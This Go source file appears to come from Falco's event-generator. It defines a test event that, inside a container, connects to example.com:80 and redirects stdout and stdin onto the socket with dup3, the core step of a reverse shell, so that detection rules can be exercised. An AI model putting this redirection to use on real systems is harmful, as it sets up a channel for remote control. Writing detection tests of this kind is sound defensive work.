// SPDX-License-Identifier: Apache-2.0
/*
Copyright (C) 2023 The Falco Authors.
Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package syscall

import (
    "bufio"
    "net"
    "os"
    "syscall"

    "github.com/falcosecurity/event-generator/events"
)

var _ = events.Register(RedirectStdoutStdinToNetworkConnectionInContainer)

func RedirectStdoutStdinToNetworkConnectionInContainer(h events.Helper) error {
    if h.InContainer() {
        // Connect to a remote host
        conn, err := net.Dial("tcp", "example.com:80")
        if err != nil {
            h.Log().WithError(err).Error("Failed to connect to remote host")
            return err
        }
        defer conn.Close()

        // retrieve file descriptor of the connection
        tcpConn, ok := conn.(*net.TCPConn)
        if !ok {
            h.Log().Error("Failed to get TCP connection")
            return nil
        }

        file, err := tcpConn.File()
        if err != nil {
            h.Log().WithError(err).Error("Failed to get file descriptor from connection")
            return err
        }
        defer file.Close()

        fd := int(file.Fd())

        // Duplicate the file descriptor of the connection to stdout (1) and stdin (0)
        err = syscall.Dup3(fd, 1, 0)
        if err != nil {
            h.Log().WithError(err).Error("Failed to duplicate file descriptor to stdout")
            return err
        }
        err = syscall.Dup3(fd, 0, 0)
        if err != nil {
            h.Log().WithError(err).Error("Failed to duplicate file descriptor to stdin")
            return err
        }

        // Read from stdin (now redirected to the network connection)
        scanner := bufio.NewScanner(os.Stdin)
        if scanner.Scan() {
            scanner.Text()
            h.Log().Infof("Redirect stdout/stdin to network connection")
        } else {
            h.Log().Error("Failed to read from stdin")
        }
    } 

    return nil
}